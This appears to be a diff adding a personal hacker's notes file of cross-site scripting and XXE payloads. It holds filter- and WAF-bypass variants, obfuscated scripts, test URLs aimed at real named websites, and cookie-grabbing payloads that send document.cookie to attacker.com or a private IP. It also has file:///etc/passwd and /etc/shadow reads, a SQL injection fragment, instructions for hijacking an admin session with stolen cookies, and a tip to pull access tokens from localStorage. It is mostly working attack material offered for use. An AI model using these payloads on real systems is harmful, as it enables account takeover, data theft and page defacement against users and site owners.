@@ -1,0 +1,125 @@
+Replace alert with prompt
+http://dotphp.net/xsspayloader/ => xss payloads generator
+https://int0x33.medium.com/day-35-xss-payloads-217ab6c6ead7 => Xss Paylods
+https://jsfiddle.net/tismayil/ufowpgcr/1/ => payload tester
+https://category.yahboom.net/search?type=product&q=<script>alert&#40;1&#41;<&#47;script>
+Cookie grabbing: 1. <script>location.href="http://www.attacker.com?"+document.cookie;</script>
+2. <script>document.write("<img src="http://192.168.0.22/?'document.cookie+' "/>');</script>
+https://www.glassdoor.com/searchsuggest/typeahead?numSuggestions=8rk3s6%22%3Cimg/**/src%3D%22x%22/**/onx%3D%22%22/**/onerror%3D%22alert%60l0cpd%60%22%3Ef9y60  => Weird Method
+https://hackerone.com/reports/846338 => XSS using WAF Bypass
+<br><h1%20style="color:red;">Welcome</h1><br><b>CLick<a%20href="javascript:alert(1);">%20here</a></b><!--
+<svg/onload =’[][`cons`+`tructor`][`const`+`ructor`](`aler`+`t(1)`)()’>
+1"-top["con\x66irm"](document.domain)-"
+{{[].%22-alert`1`-%22}}
+
+<br><h1%20style="color:red;">Welcome</h1><br><b>CLick<a%20href="javascript%26colon%3Balert(1);">%20here</a></b><!-- => xss filter bypass
+
+</p><script>alert(1)</script><p>
+"onmouse="alert
+test" onmouseover=alert("XSS"); p="
+<svg><animate onend=alert(document.cookie) attributeName=x dur=1s>  => Use this on Talikn to chat persons
+<form><button formaction=javascript:alert(document.domain)>button</button> => To create a button
+&p=--><svg/onload=alert(0)> => all HTML tags blocked
+“/><iframe src=”file:///etc/shadow”></iframe>
+
+<h1>Web Page Hacked</h1>
+<A HREF="http://bing.com/">Web Page Hacked</A>
+<a onmouseover="alert(1)"\>Click me!</a>
+<iframe src='file:///etc/passwd'><iframe>
+<a%20href="javascript;alert(1);">%20here</a><!--
+"><img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>
+
+													=> Weird Method
+<svg onload%3Da=alert,b=document.cookie,[b],find(a)>    	
+%2uscript%2salert()%2u%2fscript%2u
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
+"><IMG SRC=X ONERROR=ALERT(2)>.JPEG
+"><img src=1 onerror=alert(document.domain)/>
+<iframe src="javascript:alert(`xss`)"> 										' or 1=1--
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<svg onload=alert(1)/>
+<body onload=alert(1)
+<indexof src=javascript:alert(1)/>
+<svg xmlns="http://www.bing.com" onload="alert(document.doamin)"/>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<svg onload=alert%26%230000000040"1")>
+<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
+
+<script>eval('\\u'+'0061'+'lert`_Y000!_`')</script>
+
+<script>throw~delete~typeof~prompt`_Y000!_`</script>
+
+<script>(()=>{return this})().alert`_Y000!_`</script
+
+<script src=//server.com/xss.js> === Nothing
+<script src="(https)://bing.com/xss.js">
+<input type="hidden" accesskey="X" onclick="alert(1)">
+<input type="hidden" name="redacted" value="default" injection="xss" />
+<svg><animate onbegin=alert(Hello) attributeName=x></svg>
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+Dont Forget to look for hidden parameter Search for "hidden" , "input" or "var"
+
+Bonus Payload: <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+
+http://www.xss-payloads.com/
+censys.io
+plecibo Effect // Education is manifestation perfection is already in the man
+
+XXE Attack Payload => 
+1.<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+2.
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+DOM (Special)
+Persistent (Server-side)
+Reflected (Client-side)
+
+https://github.com/ihebski/XSS-Payloads
+www.Xss-payloads.com
+
+A Note For Stored XSS
+<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>COPY
+So here is the attack URL which will send the cookies to our server: 
+
+// You can Use nginx Server Stored in your kali machine when a admin clicks on your like you will get their cookie /var/lib/nginx/log {chek for location not sure}  Steal their cookie Get their session and hijack their Account
+
+http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new  Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
+
+an XSS payload, Cuneiform-alphabet based
+
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+
+waf bYPASS
+"><div class=progress><div onwebkitanimationstart=prompt(document.domain) class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">
+
+
+When you find input field which allows " (quotes), try this payload:
+"autofocus onfocus=alert(1)// -> Doesn't work
+
+"type%3d"text"autofocus%20onfocus%3d"alert(1)" -> Works
+<Svg/Onload=top%5B"al"%2B"ert%5D(1)//
+
+XSS on disabled input field 
+
+<input disabled=disabled onbeforecopy=alert(1) value=copyme>
+
+<script type="text/javascript">
+//<![CDATA[
+alert('Invalid Captcha')//]]>
+</script>
+
+
+Instead of alert (document.domain) to popup for xss try to access tokens 
+Like 
+alert(localStorage.getItem('access_token'))
+May be u can get something, I hope.
